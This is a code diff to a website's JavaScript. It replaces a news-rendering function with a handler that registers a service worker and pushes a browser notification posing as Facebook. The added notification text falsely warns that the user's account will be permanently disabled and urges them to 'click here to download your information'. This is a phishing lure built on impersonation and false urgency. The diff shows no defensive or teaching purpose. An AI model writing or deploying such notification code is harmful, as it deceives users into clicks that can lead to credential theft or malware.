@@ -1,41 +1,27 @@
-// Fetch the news data from the JSON file
-fetch('/news.json')
-    .then(response => response.json())
-    .then(data => displayNews(data));
+document.getElementById('notify-btn').addEventListener('click', function() {
+            // Check if the browser supports notifications
+            if ('Notification' in window) {
+                // Request permission from the user
+                Notification.requestPermission().then(function(permission) {
+                    if (permission === 'granted') {
+                        // Register the service worker
+                        navigator.serviceWorker.register('/Notification.js').then(function(registration) {
+                            console.log('Service Worker registered with scope:', registration.scope);
 
-// Function to display news items
-function displayNews(newsItems) {
-    const newsContainer = document.getElementById('news-container');
-    newsItems.forEach(item => {
-        const newsElement = document.createElement('div');
-        newsElement.className = 'news-item';
-
-        const imageElement = document.createElement('img');
-        imageElement.className = 'news-image';
-        imageElement.src = item.image;
-        imageElement.alt = item.title;
-
-        const contentElement = document.createElement('div');
-        contentElement.className = 'news-content';
-
-        const titleElement = document.createElement('h2');
-        titleElement.className = 'news-title';
-        titleElement.textContent = item.title;
-
-        const dateElement = document.createElement('p');
-        dateElement.className = 'news-date';
-        dateElement.textContent = new Date(item.date).toLocaleDateString();
-
-        const descriptionElement = document.createElement('p');
-        descriptionElement.className = 'news-description';
-        descriptionElement.textContent = item.description;
-
-        contentElement.appendChild(titleElement);
-        contentElement.appendChild(dateElement);
-        contentElement.appendChild(descriptionElement);
-
-        newsElement.appendChild(imageElement);
-        newsElement.appendChild(contentElement);
-        newsContainer.appendChild(newsElement);
-    });
-}
+                            // Show a notification
+                            registration.showNotification('Facebook', {
+                                body: 'your account will be permanently disabled after sometimes because it violates our terms of services & privacy policy also you have clicked on third party illegal websites button click here to download your information',
+                                icon: '/Img/images.png',
+                                badge: '/Img/Picsart_24-06-04_17-32-42-752.png'
+                            });
+                        }).catch(function(error) {
+                            console.error('Service Worker registration failed:', error);
+                        });
+                    } else {
+                        alert('Notifications are disabled.');
+                    }
+                });
+            } else {
+                alert('This browser does not support notifications.');
+            }
+        });
